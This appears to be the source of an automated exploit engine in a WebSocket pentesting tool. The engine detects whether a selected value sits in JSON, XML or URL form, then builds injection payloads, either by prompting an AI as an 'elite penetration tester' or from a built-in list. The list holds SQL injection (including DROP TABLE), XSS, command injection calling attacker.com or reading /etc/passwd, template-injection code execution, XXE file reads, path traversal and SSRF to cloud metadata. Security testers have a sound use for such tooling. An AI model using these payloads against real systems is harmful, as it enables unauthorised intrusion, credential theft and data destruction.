#!/usr/bin/env python3
"""
WSHawk AI Exploit Engine
========================
Heuristic Auto-Exploit: Context-aware payload generation.

Takes highlighted text from ReqForge, analyzes its syntactic position
(JSON value, XML attribute, URL parameter, raw), and generates
precisely-encoded, context-aware payloads via the AIEngine.

Architecture:
    ai_exploit_engine.py  →  pure business logic (this file)
    gui_bridge.py         →  thin REST route  (POST /ai/context-exploit)
    renderer.js           →  right-click context menu + Blaster integration
"""

import re
import json
import html as html_mod
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import quote as url_quote

from .ai_engine import AIEngine
from .logger import get_logger

logger = get_logger("AIExploitEngine")

# ── Vulnerability type definitions ──────────────────────────────────

VULN_TYPES = {
    "sqli":    "SQL Injection",
    "xss":     "Cross-Site Scripting",
    "idor":    "Insecure Direct Object Reference (IDOR)",
    "cmdi":    "OS Command Injection",
    "ssti":    "Server-Side Template Injection",
    "nosql":   "NoSQL Injection",
    "lfi":     "Local File Inclusion / Path Traversal",
    "xxe":     "XML External Entity Injection",
    "ssrf":    "Server-Side Request Forgery",
    "authn":   "Authentication Bypass",
}

# ── Fallback payloads (when AI is unavailable) ──────────────────────

FALLBACK_PAYLOADS: Dict[str, List[str]] = {
    "sqli": [
        "' OR '1'='1",
        "1; DROP TABLE users--",
        "1 UNION SELECT NULL,NULL,NULL--",
        "' OR 1=1--",
        "1' AND SLEEP(5)--",
        "admin'--",
        "1 OR 1=1",
        "' UNION SELECT username,password FROM users--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "'-alert(1)-'",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "{{7*7}}",
    ],
    "idor": [
        "0", "-1", "1", "2", "100", "999999",
        "null", "undefined", "NaN",
        "../../../etc/passwd",
        "admin",
    ],
    "cmdi": [
        "; id", "| id", "$(id)", "`id`",
        "; cat /etc/passwd",
        "| whoami",
        "&& curl http://attacker.com",
        "$(sleep 5)",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>",
        "{{config}}", "{{self.__class__}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ],
    "nosql": [
        '{"$gt": ""}', '{"$ne": null}',
        '{"$regex": ".*"}',
        "true, $where: '1 == 1'",
        '{"$gt": 0}',
    ],
    "lfi": [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/etc/passwd%00",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "php://filter/convert.base64-encode/resource=index.php",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>',
    ],
    "ssrf": [
        "http://127.0.0.1",
        "http://localhost:8080",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]",
        "file:///etc/passwd",
    ],
    "authn": [
        "admin", "root", "test",
        '{"role": "admin"}',
        "true",
        "1",
    ],
}


class AIExploitEngine:
    """
    Heuristic Auto-Exploit Engine.

    Analyzes the syntactic position of a user's selection within a
    message body, then generates context-aware payloads that are
    properly encoded for the detected format.
    """

    def __init__(self, ai_engine: Optional[AIEngine] = None):
        self.ai = ai_engine

    # ── Context Detection ────────────────────────────────────────────

    def detect_context(
        self, full_text: str, selection: str, cursor_pos: int
    ) -> Dict[str, Any]:
        """
        Analyze the format around the selected text.

        Returns a context dict describing the syntactic environment:
            format:       'json' | 'xml' | 'url' | 'raw'
            key:          the parameter/attribute name (if detected)
            data_type:    'string' | 'integer' | 'boolean' | 'null' | 'unknown'
            breakout:     character(s) needed to break out of the value
            nesting:      depth of nesting (for JSON)
            selection:    the original selection
        """
        ctx: Dict[str, Any] = {
            "format": "raw",
            "key": "",
            "data_type": "unknown",
            "breakout": "",
            "nesting": 0,
            "selection": selection,
        }

        stripped = full_text.strip()

        # ── Try JSON ─────────────────────────────────────────────────
        if self._looks_like_json(stripped):
            ctx["format"] = "json"
            self._analyze_json_context(full_text, selection, cursor_pos, ctx)
            return ctx

        # ── Try XML ──────────────────────────────────────────────────
        if self._looks_like_xml(stripped):
            ctx["format"] = "xml"
            self._analyze_xml_context(full_text, selection, cursor_pos, ctx)
            return ctx

        # ── Try URL-encoded ──────────────────────────────────────────
        if self._looks_like_url_params(stripped):
            ctx["format"] = "url"
            self._analyze_url_context(full_text, selection, cursor_pos, ctx)
            return ctx

        # ── Raw fallback ─────────────────────────────────────────────
        ctx["format"] = "raw"
        ctx["data_type"] = self._guess_data_type(selection)
        return ctx

    # ── Exploit Generation ───────────────────────────────────────────

    async def generate_exploits(
        self,
        full_text: str,
        selection: str,
        cursor_pos: int,
        vuln_types: Optional[List[str]] = None,
        count: int = 10,
    ) -> Dict[str, Any]:
        """
        Main entry point for the Highlight-to-Hack pipeline.

        1. detect_context()  → understand the format
        2. Build context-aware prompt
        3. Call AIEngine (or fall back to static payloads)
        4. Post-process: encode payloads for the detected format
        5. Return { payloads, context, blaster_template }
        """
        context = self.detect_context(full_text, selection, cursor_pos)

        if not vuln_types:
            vuln_types = self._suggest_vuln_types(context)

        # Build the blaster template: replace selection with §inject§
        blaster_template = self._build_template(full_text, selection)

        # Generate payloads
        raw_payloads = await self._get_payloads(
            full_text, selection, context, vuln_types, count
        )

        # Post-process: encode for the target format
        encoded_payloads = self._encode_payloads(raw_payloads, context)

        # Deduplicate while preserving order
        seen = set()
        unique = []
        for p in encoded_payloads:
            if p not in seen:
                seen.add(p)
                unique.append(p)

        return {
            "payloads": unique,
            "context": context,
            "blaster_template": blaster_template,
            "vuln_types": vuln_types,
            "vuln_labels": [VULN_TYPES.get(v, v) for v in vuln_types],
        }

    # ── Private: format detection helpers ────────────────────────────

    @staticmethod
    def _looks_like_json(text: str) -> bool:
        t = text.lstrip()
        return t.startswith("{") or t.startswith("[")

    @staticmethod
    def _looks_like_xml(text: str) -> bool:
        t = text.lstrip()
        return t.startswith("<") and not t.startswith("<!")

    @staticmethod
    def _looks_like_url_params(text: str) -> bool:
        return bool(re.search(r'[a-zA-Z0-9_]+=.+', text) and '&' in text)

    @staticmethod
    def _guess_data_type(value: str) -> str:
        v = value.strip().strip('"').strip("'")
        if v in ("true", "false"):
            return "boolean"
        if v in ("null", "None", "undefined"):
            return "null"
        try:
            int(v)
            return "integer"
        except ValueError:
            pass
        try:
            float(v)
            return "float"
        except ValueError:
            pass
        return "string"

    def _analyze_json_context(
        self, full_text: str, selection: str, cursor_pos: int, ctx: Dict
    ) -> None:
        """Extract key name, data type, and nesting depth from JSON."""
        # Find the key preceding the selection
        sel_start = full_text.find(selection)
        if sel_start == -1:
            sel_start = cursor_pos

        # Look backwards for a key pattern: "key": or "key" :
        before = full_text[:sel_start]
        key_match = re.search(r'"([^"]+)"\s*:\s*$', before)
        if key_match:
            ctx["key"] = key_match.group(1)

        # Determine data type of the selected value
        sel_stripped = selection.strip()

        # Check if the selection IS a "key": value pair
        kv_match = re.match(r'"([^"]+)"\s*:\s*(.+)', sel_stripped)
        if kv_match:
            ctx["key"] = kv_match.group(1)
            sel_stripped = kv_match.group(2).strip().rstrip(",")

        ctx["data_type"] = self._guess_data_type(sel_stripped)

        # Determine breakout character
        if sel_stripped.startswith('"'):
            ctx["breakout"] = '"'
        elif ctx["data_type"] == "integer":
            ctx["breakout"] = ""  # integers don't need breakout
        else:
            ctx["breakout"] = '"'

        # Nesting depth: count { before the selection
        ctx["nesting"] = before.count("{") - before.count("}")

    def _analyze_xml_context(
        self, full_text: str, selection: str, cursor_pos: int, ctx: Dict
    ) -> None:
        """Extract tag name and attribute from XML context."""
        sel_start = full_text.find(selection)
        if sel_start == -1:
            sel_start = cursor_pos

        before = full_text[:sel_start]

        # Check if inside an attribute: attr="VALUE"
        attr_match = re.search(r'(\w+)\s*=\s*["\']?$', before)
        if attr_match:
            ctx["key"] = attr_match.group(1)
            ctx["breakout"] = '"'
            ctx["data_type"] = "string"
        else:
            # Inside a tag body: <tag>VALUE</tag>
            tag_match = re.search(r'<(\w+)[^>]*>\s*$', before)
            if tag_match:
                ctx["key"] = tag_match.group(1)
            ctx["breakout"] = "<"
            ctx["data_type"] = self._guess_data_type(selection)

    def _analyze_url_context(
        self, full_text: str, selection: str, cursor_pos: int, ctx: Dict
    ) -> None:
        """Extract parameter name from URL-encoded body."""
        sel_start = full_text.find(selection)
        if sel_start == -1:
            sel_start = cursor_pos

        before = full_text[:sel_start]

        # Find the last param= before cursor
        param_match = re.search(r'(?:^|&)(\w+)=$', before)
        if param_match:
            ctx["key"] = param_match.group(1)

        ctx["breakout"] = "&"
        ctx["data_type"] = self._guess_data_type(selection)

    # ── Private: vuln type suggestion ────────────────────────────────

    @staticmethod
    def _suggest_vuln_types(ctx: Dict) -> List[str]:
        """
        Auto-suggest relevant vuln types based on context.
        """
        suggestions = []
        key = ctx.get("key", "").lower()
        dtype = ctx.get("data_type", "")
        fmt = ctx.get("format", "raw")

        # IDOR indicators
        if key in ("id", "uid", "user_id", "userid", "account", "account_id",
                    "order_id", "doc_id", "file_id", "record", "ref"):
            suggestions.append("idor")

        # SQLi indicators
        if dtype in ("integer", "string") and key in (
            "id", "uid", "user_id", "username", "email", "search",
            "query", "filter", "sort", "order", "where", "name", "q",
        ):
            suggestions.append("sqli")

        # XSS indicators
        if dtype == "string" and key in (
            "name", "message", "comment", "text", "title",
            "search", "query", "q", "input", "value", "data",
        ):
            suggestions.append("xss")

        # Command injection
        if key in ("cmd", "command", "exec", "run", "shell", "ping",
                    "host", "hostname", "ip", "target", "filename", "file"):
            suggestions.append("cmdi")

        # SSRF indicators
        if key in ("url", "uri", "link", "redirect", "callback",
                    "webhook", "fetch", "load", "src", "href"):
            suggestions.append("ssrf")

        # LFI indicators
        if key in ("file", "path", "filename", "filepath", "page",
                    "template", "include", "doc", "load"):
            suggestions.append("lfi")

        # SSTI
        if key in ("template", "view", "render", "name", "title", "text"):
            suggestions.append("ssti")

        # XML-specific
        if fmt == "xml":
            suggestions.append("xxe")

        # NoSQL
        if fmt == "json" and key in ("username", "password", "email",
                                      "login", "user", "pass", "token"):
            suggestions.append("nosql")

        # Default: if nothing matched, try SQLi + XSS
        if not suggestions:
            suggestions = ["sqli", "xss"]

        return suggestions

    # ── Private: payload generation ──────────────────────────────────

    async def _get_payloads(
        self,
        full_text: str,
        selection: str,
        context: Dict,
        vuln_types: List[str],
        count: int,
    ) -> List[str]:
        """
        Generate payloads via AI engine, with fallback to static payloads.
        """
        # Try AI first
        if self.ai:
            try:
                ai_payloads = await self._ai_generate(
                    full_text, selection, context, vuln_types, count
                )
                if ai_payloads:
                    return ai_payloads
            except Exception as e:
                logger.warning(f"AI generation failed, using fallback: {e}")

        # Fallback: static payloads
        return self._static_payloads(vuln_types, count)

    async def _ai_generate(
        self,
        full_text: str,
        selection: str,
        context: Dict,
        vuln_types: List[str],
        count: int,
    ) -> List[str]:
        """Build a highly context-aware prompt and call the AI engine."""
        fmt = context["format"]
        key = context.get("key", "unknown")
        dtype = context.get("data_type", "unknown")
        breakout = context.get("breakout", "")

        vuln_labels = ", ".join(
            VULN_TYPES.get(v, v) for v in vuln_types
        )

        prompt = f"""Act as an elite penetration tester. Analyze this WebSocket message and generate {count} context-aware exploit payloads.

MESSAGE CONTEXT:
```
{full_text[:500]}
```

TARGET PARAMETER: "{key}" (currently set to: {selection.strip()})
DATA TYPE: {dtype}
MESSAGE FORMAT: {fmt.upper()}
BREAKOUT CHARACTER: {breakout or 'none (numeric)'}
VULNERABILITY TYPES TO TEST: {vuln_labels}

INSTRUCTIONS:
- Each payload must be a DROP-IN REPLACEMENT for the value "{selection.strip()}" in the {fmt.upper()} message
- Payloads must be syntactically valid within the {fmt.upper()} structure (properly escaped)
- For {fmt.upper()} strings: include the surrounding quotes if needed
- For integers: payloads that test type confusion (strings where ints expected) are valuable
- Focus on bypass techniques, edge cases, and modern exploit variations
- Make payloads that would actually trigger the vulnerability, not just test strings
- Return ONLY a raw JSON array of strings. No explanation, no markdown."""

        return await self.ai.generate_payloads(prompt, vuln_labels, count)

    def _static_payloads(
        self, vuln_types: List[str], count: int
    ) -> List[str]:
        """Gather fallback payloads from the static dictionary."""
        payloads: List[str] = []
        per_type = max(count // len(vuln_types), 2) if vuln_types else count

        for vt in vuln_types:
            pool = FALLBACK_PAYLOADS.get(vt, [])
            payloads.extend(pool[:per_type])

        return payloads[:count] if len(payloads) > count else payloads

    # ── Private: template building ───────────────────────────────────

    @staticmethod
    def _build_template(full_text: str, selection: str) -> str:
        """
        Build a Blaster template by replacing the selected text with §inject§.
        """
        idx = full_text.find(selection)
        if idx == -1:
            return full_text  # Can't find selection, return as-is

        return full_text[:idx] + "§inject§" + full_text[idx + len(selection):]

    # ── Private: payload encoding ────────────────────────────────────

    def _encode_payloads(
        self, payloads: List[str], context: Dict
    ) -> List[str]:
        """
        Encode payloads for the target format so they're syntactically
        valid when dropped into the template.
        """
        fmt = context.get("format", "raw")
        dtype = context.get("data_type", "string")

        if fmt == "json":
            return self._encode_for_json(payloads, dtype)
        elif fmt == "xml":
            return self._encode_for_xml(payloads)
        elif fmt == "url":
            return self._encode_for_url(payloads)
        else:
            return payloads  # Raw: no encoding needed

    @staticmethod
    def _encode_for_json(payloads: List[str], data_type: str) -> List[str]:
        """
        Encode payloads for JSON context.
        - String values: JSON-escape and wrap in quotes
        - Integer values: leave numeric payloads bare,
          wrap non-numeric in quotes (type confusion attack)
        """
        encoded = []
        for p in payloads:
            p_stripped = p.strip().strip('"').strip("'")
            if data_type == "integer":
                # Test if it's still numeric
                try:
                    int(p_stripped)
                    encoded.append(p_stripped)
                except ValueError:
                    # Type confusion: inject string where int expected
                    encoded.append(json.dumps(p_stripped))
            else:
                # String context: JSON-escape
                encoded.append(json.dumps(p_stripped))
        return encoded

    @staticmethod
    def _encode_for_xml(payloads: List[str]) -> List[str]:
        """XML-encode special characters."""
        return [html_mod.escape(p) for p in payloads]

    @staticmethod
    def _encode_for_url(payloads: List[str]) -> List[str]:
        """URL-encode payloads."""
        return [url_quote(p, safe='') for p in payloads]
